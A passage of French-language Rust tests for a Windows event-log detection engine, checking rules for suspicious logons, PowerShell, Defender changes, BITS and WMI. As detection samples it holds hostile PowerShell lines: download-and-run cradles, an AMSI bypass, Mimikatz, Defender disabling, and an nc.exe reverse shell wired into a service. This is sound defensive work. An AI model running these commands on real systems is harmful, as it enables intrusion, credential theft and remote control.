    let mut objets: Vec<(usize, &str, Gravite)> = t.iter().map(|x| (x.volet, x.objet.as_str(), x.gravite)).collect();
    objets.sort_unstable();
    assert_eq!(
        objets,
        [
            (0, "internet|alice", Gravite::Alerte),
            (0, "partage|alice", Gravite::Info),
            (1, "internet|alice", Gravite::Alerte),
            (2, "internet|alice", Gravite::Alerte),
        ]
    );
    assert!(t.iter().any(|x| x.details.iter().any(|(_, v)| v == "174.127.93.2")));
    // Par un tunnel : la boucle locale, en Alerte.
    let tunnel = sec(
        4624,
        0,
        &[
            ("LogonType", "10"),
            ("IpAddress", "127.0.0.1"),
            ("TargetUserName", "alice"),
        ],
    );
    assert_eq!(gravites(&juger(&[tunnel]), "EVT-RDP-001"), [Gravite::Alerte]);
}

// ---------------------------------------------------------------------------------------------------------------
// EVT-IDE-001
// ---------------------------------------------------------------------------------------------------------------

#[test]
fn autres_identifiants_par_un_programme_inhabituel() {
    let par = |s, p: &str| {
        sec(
            4648,
            s,
            &[
                ("ProcessName", p),
                ("TargetUserName", "admin"),
                ("TargetServerName", "srv"),
            ],
        )
    };
    let js = juger(&[
        par(0, r"C:\Users\bob\AppData\Local\Temp\x.exe"),
        par(1, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
        par(2, r"C:\Windows\System32\svchost.exe"),
        par(3, r"C:\WINDOWS\system32\SVCHOST.EXE"),
        par(4, r"C:\Windows\System32\lsass.exe"),
        par(5, r"C:\Program Files\Sauvegarde\agent.exe"),
        par(6, r"C:\Users\bob\svchost.exe"),
        par(7, "-"),
    ]);
    let mut v: Vec<(String, Gravite)> = trouvailles(&js, "EVT-IDE-001")
        .iter()
        .map(|t| (t.objet.split('|').next().unwrap().to_string(), t.gravite))
        .collect();
    v.sort();
    assert_eq!(
        v,
        [
            (r"c:\program files\sauvegarde\agent.exe".to_string(), Gravite::Info),
            (r"c:\users\bob\appdata\local\temp\x.exe".to_string(), Gravite::Alerte),
            (r"c:\users\bob\svchost.exe".to_string(), Gravite::Alerte),
            (
                r"c:\windows\system32\windowspowershell\v1.0\powershell.exe".to_string(),
                Gravite::Alerte
            ),
        ]
    );
}

// ---------------------------------------------------------------------------------------------------------------
// EVT-PSH-001
// ---------------------------------------------------------------------------------------------------------------

#[test]
fn scripts_suspects() {
    let cas = [
        (
            "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')",
            Some("telecharge"),
        ),
        (
            "$w=New-Object Net.WebClient;$w.('Down'+'loadString').Invoke('http://x')",
            Some("telecharge"),
        ),
        (
            "(New-Object Net.WebClient).Dow`nloadStr`ing('http://x')",
            Some("telecharge"),
        ),
        ("iwr http://x.test/a.ps1 | iex", Some("telecharge")),
        (
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
            Some("amsi"),
        ),
        (
            "[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')",
            Some("amsi"),
        ),
        ("Invoke-Mimikatz -DumpCreds", Some("outil")),
        ("Set-MpPreference -DisableRealtimeMonitoring $true", Some("desarme")),
        ("Add-MpPreference -ExclusionPath C:\\x", Some("desarme")),
        (
            "IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))",
            Some("encode"),
        ),
        (
            "Start-Process powershell -ArgumentList '-nop -enc SQBFAFgA'",
            Some("encode"),
        ),
        ("Get-ChildItem C:\\Users | Sort-Object Length", None),
        (
            "Invoke-WebRequest https://example.test/notes.txt -OutFile notes.txt",
            None,
        ),
        ("$index = 3; Write-Output $index", None),
    ];
    for (texte, attendu) in cas {
        assert_eq!(script_suspect(texte).map(|x| x.0), attendu, "{texte}");
    }
}

#[test]
fn blocs_de_script_des_deux_powershell() {
    let bloc = |j: &str, f: &str, texte: &str, niveau: u8| {
        let mut e = ev(
            j,
            f,
            4104,
            0,
            &[
                ("MessageNumber", "1"),
                ("MessageTotal", "1"),
                ("ScriptBlockText", texte),
                ("ScriptBlockId", "{1}"),
                ("Path", ""),
            ],
        );
        e.niveau = Some(niveau);
        e
    };
    let js = juger(&[
        bloc(
            "Microsoft-Windows-PowerShell/Operational",
            "Microsoft-Windows-PowerShell",
            "IEX (iwr http://x).Content",
            5,
        ),
        bloc("PowerShellCore/Operational", "PowerShellCore", "Invoke-Mimikatz", 5),
        bloc(
            "Microsoft-Windows-PowerShell/Operational",
            "Microsoft-Windows-PowerShell",
            "Add-Type -TypeDefinition $c",
            3,
        ),
        bloc(
            "Microsoft-Windows-PowerShell/Operational",
            "Microsoft-Windows-PowerShell",
            "Get-Date",
            5,
        ),
    ]);
    let mut g = gravites(&js, "EVT-PSH-001");
    g.sort();
    assert_eq!(g, [Gravite::Info, Gravite::Alerte, Gravite::Critique]);
    assert!(regle(&js, "EVT-PSH-001").regle.limite.is_some());
}

// ---------------------------------------------------------------------------------------------------------------
// EVT-DEF-001
// ---------------------------------------------------------------------------------------------------------------

const DEF: &str = "Microsoft-Windows-Windows Defender/Operational";
const DEFP: &str = "Microsoft-Windows-Windows Defender";

#[test]
fn defender_trouve_coupe_ou_exclut() {
    let menace = ev(
        DEF,
        DEFP,
        1116,
        0,
        &[
            ("Threat Name", "Trojan:Win32/Exemple"),
            ("Path", "file:_C:\\Users\\alice\\x.exe"),
            ("Detection User", "POSTE\\alice"),
        ],
    );
    let action = ev(
        DEF,
        DEFP,
        1117,
        5,
        &[("Threat Name", "Trojan:Win32/Exemple"), ("Action Name", "Quarantine")],
    );
    let coupe = ev(DEF, DEFP, 5001, 10, &[]);
    let exclusion = ev(
        DEF,
        DEFP,
        5007,
        20,
        &[
            ("Old Value", ""),
            (
                "New Value",
                "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Jeux = 0x0",
            ),
        ],
    );
    let reglage = ev(
        DEF,
        DEFP,
        5007,
        30,
        &[
            (
                "Old Value",
                "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableBehaviorMonitoring = 0x0",
            ),
            (
                "New Value",
                "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableBehaviorMonitoring = 0x1",
            ),
        ],
    );
    let banal = ev(
        DEF,
        DEFP,
        5007,
        40,
        &[
            (
                "Old Value",
                "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Signature Updates\\SignatureType = 0x1",
            ),
            (
                "New Value",
                "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Signature Updates\\SignatureType = 0x2",
            ),
        ],
    );
    let js = juger(&[menace, action, coupe, exclusion, reglage, banal]);
    let mut objets: Vec<&str> = trouvailles(&js, "EVT-DEF-001")
        .iter()
        .map(|t| t.objet.split([':', '|']).next().unwrap())
        .collect();
    objets.sort_unstable();
    assert_eq!(objets, ["action", "exclusion", "menace", "reglage", "temps-reel"]);
}

#[test]
fn defender_qui_n_est_pas_l_antivirus() {
    let coupe = ev(DEF, DEFP, 5001, 10, &[]);
    // Un autre antivirus : Defender se met en retrait lui-même, sans objet.
    let js = juger_avec(
        std::slice::from_ref(&coupe),
        &tout_lu(),
        Options {
            defender_antivirus: Some(false),
            ..options()
        },
    );
    // La coupure reste dite, en information, avec sa réserve : un faux antivirus inscrit (defendnot) met Defender
    // en retrait tout autant.
    let j = regle(&js, "EVT-DEF-001");
    assert!(!j.sans_objet && j.manques.is_empty());
    assert_eq!(j.trouvailles.len(), 1);
    assert_eq!(j.trouvailles[0].gravite, Gravite::Info);
    assert!(j.trouvailles[0].reserves.contains(&Reserve::AutreAntivirus));
    // Rien dans le journal : sans objet.
    let js = juger_avec(
        &[],
        &tout_lu(),
        Options {
            defender_antivirus: Some(false),
            ..options()
        },
    );
    let j = regle(&js, "EVT-DEF-001");
    assert!(j.sans_objet && j.trouvailles.is_empty() && j.manques.is_empty());
    // Une menace trouvée reste dite, même alors.
    let menace = ev(DEF, DEFP, 1116, 0, &[("Threat Name", "Trojan:Win32/Exemple")]);
    let js = juger_avec(
        &[coupe.clone(), menace],
        &tout_lu(),
        Options {
            defender_antivirus: Some(false),
            ..options()
        },
    );
    let j = regle(&js, "EVT-DEF-001");
    assert!(!j.sans_objet && j.trouvailles.len() == 2);
    // On ne sait pas : dit, jamais « sain ».
    let js = juger_avec(
        &[],
        &tout_lu(),
        Options {
            defender_antivirus: None,
            ..options()
        },
    );
    assert!(regle(&js, "EVT-DEF-001").manques.contains(&Manque::DefenderInconnu));
}

// ---------------------------------------------------------------------------------------------------------------
// EVT-BIT-001
// ---------------------------------------------------------------------------------------------------------------

#[test]
fn adresses_de_bits() {
    for u in [
        "http://download.windowsupdate.com/c/msdownload/update/x.cab",
        "https://dl.google.com/update2/1.3.36/GoogleUpdateSetup.exe",
        "http://msedge.b.tlu.dl.delivery.mp.microsoft.com/filestreamingservice/files/x",
        "https://download.mozilla.org/?product=firefox",
        "HTTPS://Officecdn.Microsoft.COM./pr/x.cab",
        "http://localhost:8080/x",
    ] {
        assert_eq!(adresse_inhabituelle(u), None, "{u}");
    }
    for (u, hote) in [
        (
            "https://raw.githubusercontent.com/x/y/main/p.ps1",
            "raw.githubusercontent.com",
        ),
        ("http://microsoft.com.exemple.test/a.exe", "microsoft.com.exemple.test"),
        ("http://evilmicrosoft.com/a.exe", "evilmicrosoft.com"),
        ("http://198.51.100.7:8080/a.exe", "198.51.100.7"),
        ("http://microsoft.com@example.com/a.exe", "microsoft.com@example.com"),
        (
            "http://microsoft.com\\@example.com/a.exe",
            "microsoft.com\\@example.com",
        ),
        ("ftp://exemple.test/a.exe", "exemple.test"),
    ] {
        assert_eq!(adresse_inhabituelle(u).map(|x| x.0), Some(hote.to_string()), "{u}");
    }
    assert!(adresse_inhabituelle(r"\\serveur\partage\a.exe").is_some());
    let job = ev(
        "Microsoft-Windows-Bits-Client/Operational",
        "Microsoft-Windows-Bits-Client",
        59,
        0,
        &[
            ("transferId", "{1}"),
            ("name", "x"),
            ("url", "http://exemple.test/a.exe"),
        ],
    );
    assert_eq!(gravites(&juger(&[job]), "EVT-BIT-001"), [Gravite::Alerte]);
}

// ---------------------------------------------------------------------------------------------------------------
// EVT-WMI-001 et EVT-AUD-001
// ---------------------------------------------------------------------------------------------------------------

#[test]
fn abonnement_wmi_permanent() {
    let x = |consommateur: &str| {
        format!(
            "<Event><System><Provider Name='Microsoft-Windows-WMI-Activity'/><EventID>5861</EventID>\
             <TimeCreated SystemTime='2026-10-18T14:05:09Z'/><EventRecordID>7</EventRecordID>\
             <Channel>Microsoft-Windows-WMI-Activity/Operational</Channel><Computer>poste-alice</Computer></System>\
             <UserData><Operation_ESStoConsumerBinding xmlns='http://manifests.microsoft.com/win/2006/windows/WMI'>\
             <Namespace>//./root/subscription</Namespace><ESS>Filtre</ESS><CONSUMER>{consommateur}</CONSUMER>\
             <PossibleCause>Binding EventFilter: …</PossibleCause></Operation_ESStoConsumerBinding></UserData></Event>"
        )
    };
    let js = juger(&[
        du_xml(&x("CommandLineEventConsumer=\"Mise a jour\"")),
        du_xml(&x("NTEventLogEventConsumer=\"SCM Event Log Consumer\"")),
    ]);
    let mut g = gravites(&js, "EVT-WMI-001");
    g.sort();
    assert_eq!(g, [Gravite::Info, Gravite::Critique]);
}

#[test]
fn politique_d_audit_changee() {
    let reduite = sec(
        4719,
        0,
        &[
            ("SubcategoryGuid", "{0CCE9215-69AE-11D9-BED3-505054503030}"),
            ("AuditPolicyChanges", "%%8448, %%8450"),
        ],
    );
    let ajoutee = sec(
        4719,
        1,
        &[
            ("SubcategoryGuid", "{0CCE922B-69AE-11D9-BED3-505054503030}"),
            ("AuditPolicyChanges", "%%8449"),
        ],
    );
    let mut g = gravites(&juger(&[reduite, ajoutee]), "EVT-AUD-001");
    g.sort();
    assert_eq!(g, [Gravite::Info, Gravite::Alerte]);
}

// ---------------------------------------------------------------------------------------------------------------
// Ce qui rend une règle non vérifiée
// ---------------------------------------------------------------------------------------------------------------

fn etat(nom: &str, lecture: Lecture, active: Option<bool>) -> EtatJournal {
    EtatJournal {
        nom: nom.into(),
        lecture,
        active,
        principal: true,
        suites: Vec::new(),
    }
}

fn sauf_securite(e: EtatJournal) -> Vec<EtatJournal> {
    let mut v: Vec<EtatJournal> = tout_lu().into_iter().filter(|x| x.nom != "Security").collect();
    v.push(e);
    v
}

#[test]
fn journal_absent_refuse_illisible_desactive_ou_partiel() {
    type Cas = (Vec<EtatJournal>, fn(&Manque) -> bool);
    let cas: Vec<Cas> = vec![
        (
            tout_lu().into_iter().filter(|x| x.nom != "Security").collect(),
            |m| matches!(m, Manque::Absent(j) if j == "Security"),
        ),
        (sauf_securite(etat("Security", Lecture::Absent, None)), |m| {
            matches!(m, Manque::Absent(_))
        }),
        (sauf_securite(etat("Security", Lecture::Refuse, None)), |m| {
            matches!(m, Manque::Refuse(_))
        }),
        (
            sauf_securite(etat("Security", Lecture::Illisible("x".into()), None)),
            |m| matches!(m, Manque::Illisible(..)),
        ),
        (
            sauf_securite(etat("Security", Lecture::Lu(Vec::new()), Some(false))),
            |m| matches!(m, Manque::Desactive(_)),
        ),
        (
            sauf_securite(etat(
                "Security",
                Lecture::Lu(vec!["2 morceaux illisibles".into()]),
                Some(true),
            )),
            |m| matches!(m, Manque::Partiel(..)),
        ),
    ];
    for (etats, attendu) in cas {
        let js = juger_avec(&[], &etats, options());
        for id in [
            "EVT-ADM-001",
            "EVT-MDP-001",
            "EVT-IDE-001",
            "EVT-AUD-001",
            "EVT-EFF-001",
            "EVT-RDP-001",
        ] {
            let j = regle(&js, id);
            assert!(!j.verifie() && j.manques.iter().any(attendu), "{id} : {:?}", j.manques);
        }
        // Une règle qui ne lit pas Security reste vérifiée.
        assert!(regle(&js, "EVT-WMI-001").verifie());
    }
}

#[test]
fn un_evenement_abime_ne_permet_pas_de_conclure() {
    // Le journal se dit lu en entier, mais un événement vient d'un morceau non vérifié : la règle n'est pas
    // vérifiée, et ce qu'elle tire de lui porte la réserve.
    let mut e = sec(4720, 0, &[("TargetUserName", "carole")]);
    e.verifie = false;
    let js = juger(&[e]);
    let j = regle(&js, "EVT-ADM-001");
    assert!(!j.verifie());
    assert!(
        j.manques
            .iter()
            .any(|m| matches!(m, Manque::NonVerifies { nombre: 1, .. }))
    );
    assert!(j.trouvailles[0].reserves.contains(&Reserve::MorceauAbime));
}

#[test]
fn periode_plus_courte_que_demandee() {
    let depuis = t0() - Duration::days(7);
    let e = sec(4624, 0, &[("LogonType", "5")]);
    let js = juger_avec(
        &[e],
        &tout_lu(),
        Options {
            depuis: Some(depuis),
            ..options()
        },
    );
    assert!(
        regle(&js, "EVT-ADM-001")
            .manques
            .iter()
            .any(|m| matches!(m, Manque::PeriodeCourte { .. }))
    );
    // Un journal calme (BITS) peut n'avoir rien écrit avant : pas un manque.
    let bits = ev(
        "Microsoft-Windows-Bits-Client/Operational",
        "Microsoft-Windows-Bits-Client",
        3,
        0,
        &[],
    );
    let js = juger_avec(
        &[bits],
        &tout_lu(),
        Options {
            depuis: Some(depuis),
            ..options()
        },
    );
    assert!(regle(&js, "EVT-BIT-001").verifie());
}

/// La preuve de la campagne d'attaque n° 3 : des journaux « Operational » présents, lus, mais vides rendaient vertes
/// les règles qui n'ont de volets que sur eux (PowerShell, BITS, WMI, Defender). Désormais : non vérifiées, avec la
/// raison (journal présent mais vide), sans alerte.
#[test]
fn journal_calme_vide_n_est_pas_verifie() {
    let evs = [
        sec(4624, 0, &[("LogonType", "5"), ("TargetUserName", "SYSTEM")]),
        ev(
            "System",
            SCM,
            7036,
            0,
            &[("param1", "Windows Update"), ("param2", "running")],
        ),
    ];
    let js = juger_nu(&evs, &tout_lu(), options());
    for id in ["EVT-PSH-001", "EVT-BIT-001", "EVT-WMI-001", "EVT-DEF-001"] {
        let j = regle(&js, id);
        assert!(!j.verifie(), "{id}");
        assert!(j.trouvailles.is_empty(), "{id}");
        assert!(
            j.manques.iter().any(|m| matches!(m, Manque::VideCalme(_))),
            "{id} : {:?}",
            j.manques
        );
    }
    // Un événement dans chacun : vérifiées.
    let js = juger(&[]);
    for id in ["EVT-PSH-001", "EVT-BIT-001", "EVT-WMI-001", "EVT-DEF-001"] {
        assert!(regle(&js, id).verifie(), "{id} : {:?}", regle(&js, id).manques);
    }
}

#[test]
fn tout_lu_et_rien_trouve_est_verifie() {
    let js = juger(&[sec(4624, 0, &[("LogonType", "5")])]);
    for j in &js {
        assert!(j.trouvailles.is_empty(), "{}", j.regle.id);
        assert!(j.verifie(), "{} : {:?}", j.regle.id, j.manques);
    }
}

#[test]
fn bornes_tenues() {
    let bornes = BornesMoteur {
        trouvailles: 3,
        dates: 25,
        ..BornesMoteur::default()
    };
    let mut m = Moteur::nouveau(REGLES, options(), bornes);
    for i in 0..10 {
        m.recevoir(&sec(4720, i, &[("TargetUserName", &format!("c{i}"))]));
    }
    for i in 0..40 {
        m.recevoir(&echec(i, "alice", "-", "3"));
    }
    let js = m.conclure(&tout_lu());
    let adm = regle(&js, "EVT-ADM-001");
    assert_eq!((adm.trouvailles.len(), adm.au_dela), (3, 7));
    let mdp = regle(&js, "EVT-MDP-001");
    assert!(!mdp.trouvailles.is_empty(), "{:?}", mdp.manques);
    assert!(
        mdp.manques.iter().any(|x| matches!(x, Manque::Bornes(_))),
        "{:?}",
        mdp.manques
    );
}

#[test]
fn champs_hostiles_sans_panique() {
    let long = "é".repeat(200_000);
    let bizarres = [
        "",
        "-",
        "\u{0}",
        "0x",
        "0xFFFFFFFFFFFFFFFFFFFF",
        "\"",
        "\"\"",
        "~1",
        "a~",
        "::",
        "[",
        "http://",
        "http://@",
        "%%",
        &long,
    ];
    let mut evs = Vec::new();
    for b in bizarres {
        for (j, f, id) in [
            ("Security", AUDIT, 4625),
            ("Security", AUDIT, 4624),
            ("Security", AUDIT, 4648),
            ("Security", AUDIT, 4738),
            ("Security", AUDIT, 4732),
            ("System", SCM, 7045),
            (
                "Microsoft-Windows-PowerShell/Operational",
                "Microsoft-Windows-PowerShell",
                4104,
            ),
            (
                "Microsoft-Windows-Bits-Client/Operational",
                "Microsoft-Windows-Bits-Client",
                59,
            ),
            (DEF, DEFP, 5007),
        ] {
            let noms = [
                "TargetUserName",
                "IpAddress",
                "LogonType",
                "ProcessName",
                "OldUacValue",
                "NewUacValue",
                "TargetSid",
                "ImagePath",
                "ServiceName",
                "ScriptBlockText",
                "url",
                "New Value",
            ];
            let champs: Vec<(&str, &str)> = noms.iter().map(|n| (*n, b)).collect();
            evs.push(ev(j, f, id, 0, &champs));
        }
    }
    let js = juger(&evs);
    for j in &js {
        for t in &j.trouvailles {
            assert!(t.objet.chars().count() <= super::moteur::TEXTE_MAX + 1);
            assert!(
                t.details
                    .iter()
                    .all(|(_, v)| v.chars().count() <= super::moteur::TEXTE_MAX + 1)
            );
        }
    }
}

// ---------------------------------------------------------------------------------------------------------------
// Constats et couverture
// ---------------------------------------------------------------------------------------------------------------

fn analyse(js: Vec<Jugement>) -> Analyse {
    Analyse {
        source: Source::Dossier("d".into()),
        jugements: js,
        journaux: Vec::new(),
        etats: Vec::new(),
        manques_source: Vec::new(),
    }
}

#[test]
fn constats_et_couverture() {
    let jamais = |_: &str| false;
    let debut = (Utc::now(), std::time::Instant::now());
    // Tout lu, rien trouvé : sain.
    let r = resultat::resultat(&analyse(juger(&[])), debut, &jamais);
    assert_eq!(r.verdict(), "sain", "{:#?}", r.couverture);
    assert_eq!(r.couverture.verifies, 11);
    // Sans Security : non vérifié, jamais sain, et chaque règle qui le lit le dit.
    let sans: Vec<EtatJournal> = tout_lu().into_iter().filter(|x| x.nom != "Security").collect();
    let r = resultat::resultat(&analyse(juger_avec(&[], &sans, options())), debut, &jamais);
    assert_eq!(r.verdict(), "non-verifie");
    assert!(
        r.couverture
            .non_verifies
            .iter()
            .any(|n| n.starts_with("EVT-MDP-001") && n.contains("Security.evtx"))
    );
    // Une alerte, puis la même déclarée normale : tue, et dite dans le constat de sa règle.
    let svc = ev(
        "System",
        SCM,
        7045,
        0,
        &[("ServiceName", "x"), ("ImagePath", r"C:\Windows\Temp\x.exe")],
    );
    let a = analyse(juger(&[svc]));
    let r = resultat::resultat(&a, debut, &jamais);
    assert_eq!(r.verdict(), "probleme");
    let alerte = r.constats.iter().find(|c| c.etat == "probleme").unwrap();
    assert_eq!(alerte.regle, "EVT-SRV-001");
    let cle = resultat::cle_normale("EVT-SRV-001", r"x|c:\windows\temp\x.exe");
    assert_eq!(alerte.objet.as_deref(), Some(r"evt:x|c:\windows\temp\x.exe"));
    let normale = |c: &str| c == cle;
    let r = resultat::resultat(&a, debut, &normale);
    assert_eq!(r.verdict(), "sain");
    assert!(
        r.constats
            .iter()
            .any(|c| c.regle == "EVT-SRV-001" && c.message.contains('1'))
    );
    // Chaque constat porte sa règle, et chaque règle a le sien.
    for id in REGLES.iter().map(|r| r.id) {
        assert!(r.constats.iter().any(|c| c.regle == id), "{id}");
    }
}

// ---------------------------------------------------------------------------------------------------------------
// Les échantillons publics
// ---------------------------------------------------------------------------------------------------------------

/// Tout le jeu sur les échantillons publics : ce que chaque règle y trouve (beaucoup sont des journaux d'attaque
/// publiés), écrit pour le rapport du lot, et quelques détections sûres vérifiées.
#[test]
fn sur_les_echantillons_publics() {
    let Some(dossier) = std::env::var_os("VANGUARD_EVTX_ECHANTILLONS") else {
        return crate::essais::saute("VANGUARD_EVTX_ECHANTILLONS absente : pas d'échantillons .evtx");
    };
    let debut = std::time::Instant::now();
    let a = resultat::analyser_dossier(std::path::Path::new(&dossier), &Options::default()).unwrap();
    let duree = debut.elapsed();
    let evenements: u64 = a.journaux.iter().map(|s| s.evenements).sum();
    eprintln!("échantillons : {evenements} événements en {duree:?}");
    for j in &a.jugements {
        let mut par_gravite = [0usize; 3];
        for t in &j.trouvailles {
            par_gravite[t.gravite as usize] += 1;
        }
        eprintln!(
            "{} : {} trouvailles (info {}, alerte {}, critique {}), {} au-delà, {} manques, {} examinés",
            j.regle.id,
            j.trouvailles.len(),
            par_gravite[0],
            par_gravite[1],
            par_gravite[2],
            j.au_dela,
            j.manques.len(),
            j.examines
        );
        for t in j.trouvailles.iter().take(12) {
            eprintln!(
                "    {:?} {} ×{} {:?} {:?}",
                t.gravite,
                t.objet.chars().take(110).collect::<String>(),
                t.nombre,
                t.details
                    .iter()
                    .map(|(_, v)| v.chars().take(60).collect::<String>())
                    .collect::<Vec<_>>(),
                t.reserves
            );
        }
        for m in j.manques.iter().take(6) {
            eprintln!("    manque {m:?}");
        }
    }
    let ids = |id: &str| a.jugements.iter().find(|j| j.regle.id == id).unwrap();
    // Le 1102 de security.evtx et le 104 de system.evtx (Sysmon effacé) ; le 1149 depuis une adresse publique ;
    // la rafale d'échecs du Bureau à distance (23.94.153.202) de security_big_sample.evtx.
    assert!(
        ids("EVT-EFF-001")
            .trouvailles
            .iter()
            .any(|t| t.objet.starts_with("security|"))
    );
    assert!(
        ids("EVT-EFF-001")
            .trouvailles
            .iter()
            .any(|t| t.objet.starts_with("microsoft-windows-sysmon/operational|"))
    );
    assert!(
        ids("EVT-RDP-001")
            .trouvailles
            .iter()
            .any(|t| t.details.iter().any(|(_, v)| v == "174.127.93.2"))
    );
    assert!(
        ids("EVT-ADM-001")
            .trouvailles
            .iter()
            .any(|t| t.objet.starts_with("groupe:s-1-5-32-544:"))
    );
    // Des journaux lus en partie (morceaux abîmés exprès) : jamais « sain ».
    let r = resultat::resultat(&a, (Utc::now(), debut), &|_| false);
    assert_ne!(r.verdict(), "sain");
}

// ---------------------------------------------------------------------------------------------------------------
// Le moteur seul : conditions, preuve d'audit
// ---------------------------------------------------------------------------------------------------------------

#[test]
fn conditions_sur_les_champs() {
    use super::moteur::{Condition as C, Test as T};
    let e = sec(
        4688,
        0,
        &[("A", "  Alpha Beta "), ("N", "0x1F"), ("V", "-"), ("E", "É")],
    );
    let vrais = [
        C::Toujours,
        C::Champ("A", T::Egal("alpha beta")),
        C::Champ("A", T::Commence("ALPHA")),
        C::Champ("A", T::Finit("beta")),
        C::Champ("A", T::Contient("ha b")),
        C::Champ("A", T::Dans(&["x", "ALPHA BETA"])),
        C::Champ("N", T::NombreDans(&[31])),
        C::Champ("N", T::NombreAuMoins(31)),
        C::Champ("A", T::Rempli),
        C::Champ("E", T::Egal("é")),
        C::ChampExact("A", T::Egal("Alpha Beta")),
        C::Tous(&[C::Toujours, C::Champ("N", T::NombreAuMoins(1))]),
        C::Un(&[C::Champ("A", T::Egal("non")), C::Toujours]),
        C::Pas(&C::Champ("V", T::Rempli)),
        C::Si(|e| e.id == 4688),
    ];
    for c in vrais {
        assert!(c.vrai(&e), "{c:?}");
    }
    let faux = [
        C::ChampExact("A", T::Egal("alpha beta")),
        C::Champ("absent", T::Rempli),
        C::Champ("V", T::Rempli),
        C::Champ("N", T::NombreAuMoins(32)),
        C::Champ("A", T::NombreDans(&[0])),
        C::Un(&[]),
    ];
    for c in faux {
        assert!(!c.vrai(&e), "{c:?}");
    }
}

/// Un volet dont la sous-catégorie d'audit n'est pas sûre : sans un événement de preuve vu, non vérifié ; avec, il
/// l'est.
#[test]
fn preuve_d_audit() {
    use super::moteur::{Audit, Condition, Forme, Indice, Regle, Volet};
    static ESSAI: &[Regle] = &[Regle {
        id: "EVT-ESS-001",
        sujet: ("essai", "test"),
        techniques: &["T1059"],
        references: &[],
        volets: &[Volet {
            journal: "Security",
            fournisseurs: &[],
            ids: &[4688],
            quand: Condition::Toujours,
            forme: Forme::Chacun(|_| None::<Indice>),
            audit: Audit::Preuve {
                preuve: &[4688, 4689],
                quoi: ("création de processus", "process creation"),
            },
            sous_categorie: None,
        }],
        limite: None,
        defender: false,
    }];
    let essai = |evs: &[EvenementWindows]| {
        let mut m = Moteur::nouveau(ESSAI, options(), BornesMoteur::default());
        for e in evs {
            m.recevoir(e);
        }
        m.conclure(&tout_lu()).remove(0)
    };
    assert!(essai(&[]).manques.iter().any(|m| matches!(m, Manque::NonAudite { .. })));
    // Un événement de preuve d'un morceau abîmé ne prouve rien.
    let mut abime = sec(4689, 0, &[]);
    abime.verifie = false;
    assert!(
        essai(&[abime])
            .manques
            .iter()
            .any(|m| matches!(m, Manque::NonAudite { .. }))
    );
    assert!(essai(&[sec(4689, 0, &[])]).verifie());
}

#[test]
fn constats_de_la_source_vivante() {
    let mut etats = tout_lu();
    etats.retain(|e| e.nom != "Security");
    etats.push(etat("Security", Lecture::Refuse, None));
    let a = Analyse {
        source: Source::Vivant,
        jugements: juger_avec(&[], &etats, options()),
        journaux: Vec::new(),
        etats,
        manques_source: Vec::new(),
    };
    let (constats, couverture) = resultat::constats(&a, &|_| false);
    assert!(couverture.non_verifies.iter().any(|n| n.starts_with("EVT-MDP-001")));
    let c = constats.iter().find(|c| c.regle == "EVT-ADM-001").unwrap();
    assert!(!c.verifie);
    assert_eq!(
        c.precision,
        crate::modele::Precision::NonVerifie(crate::modele::Raison::Droits)
    );
    assert!(a.etats.iter().any(|e| e.lecture == Lecture::Refuse));
}

/// Tout le jeu sur des collections publiques de journaux d'attaque (`VANGUARD_EVTX_ATTAQUES` : un dossier, lu
/// sous-dossier par sous-dossier ; jamais dans le dépôt) : combien de fichiers chaque règle signale, et quoi. Une
/// mesure pour le rapport, sans seuil : ces collections changent.
#[test]
fn sur_les_journaux_d_attaque_publics() {
    let Some(racine) = std::env::var_os("VANGUARD_EVTX_ATTAQUES") else {
        return crate::essais::saute("VANGUARD_EVTX_ATTAQUES absente : pas de collection de journaux d'attaque");
    };
    let mut dossiers = vec![std::path::PathBuf::from(racine)];
    let mut tous = Vec::new();
    while let Some(d) = dossiers.pop() {
        let Ok(entrees) = std::fs::read_dir(&d) else { continue };
        let mut a_des_evtx = false;
        for e in entrees.flatten() {
            let p = e.path();
            if p.is_dir() && !p.ends_with(".git") {
                dossiers.push(p);
            } else if p.extension().is_some_and(|x| x.eq_ignore_ascii_case("evtx")) {
                a_des_evtx = true;
            }
        }
        if a_des_evtx {
            tous.push(d);
        }
    }
    let mut par_regle: std::collections::BTreeMap<&str, (BTreeSet<String>, Vec<String>)> =
        std::collections::BTreeMap::new();
    let mut evenements = 0u64;
    let debut = std::time::Instant::now();
    for d in &tous {
        let a = resultat::analyser_dossier(d, &Options::default()).unwrap();
        evenements += a.journaux.iter().map(|s| s.evenements).sum::<u64>();
        for j in &a.jugements {
            let e = par_regle.entry(j.regle.id).or_default();
            for t in &j.trouvailles {
                let fichier = t
                    .reperes
                    .first()
                    .and_then(|r| r.fichier.as_ref())
                    .and_then(|f| f.file_name())
                    .map_or_else(|| d.display().to_string(), |f| f.to_string_lossy().into_owned());
                if e.0.insert(fichier.clone()) || e.1.len() < 400 {
                    e.1.push(format!(
                        "{:?} {} ← {}",
                        t.gravite,
                        t.objet.chars().take(90).collect::<String>(),
                        fichier
                    ));
                }
            }
        }
    }
    eprintln!(
        "journaux d'attaque : {} dossiers, {evenements} événements en {:?}",
        tous.len(),
        debut.elapsed()
    );
    for (id, (fichiers, lignes)) in &par_regle {
        eprintln!("{id} : {} fichiers signalés", fichiers.len());
        for l in lignes {
            eprintln!("    {l}");
        }
    }
}

#[test]
fn scripts_obscurcis_et_services_detournes() {
    let cas = [
        (
            "$a=(('Do'+'wn')+('loadStr'+'ing'));(New-Object Net.WebClient).$a('http://x')",
            Some("telecharge"),
        ),
        (
            "(New-Object  Net . WebClient ) . ( 'DownloadFile' )('http://x','y')",
            None,
        ),
        (
            "$c=[System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"fs01\"))",
            Some("deplacement"),
        ),
        (
            "Set-ItemProperty -path HKLM:\\System\\CurrentControlSet\\services\\xboxgip -name ImagePath -value \"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\"",
            Some("outil"),
        ),
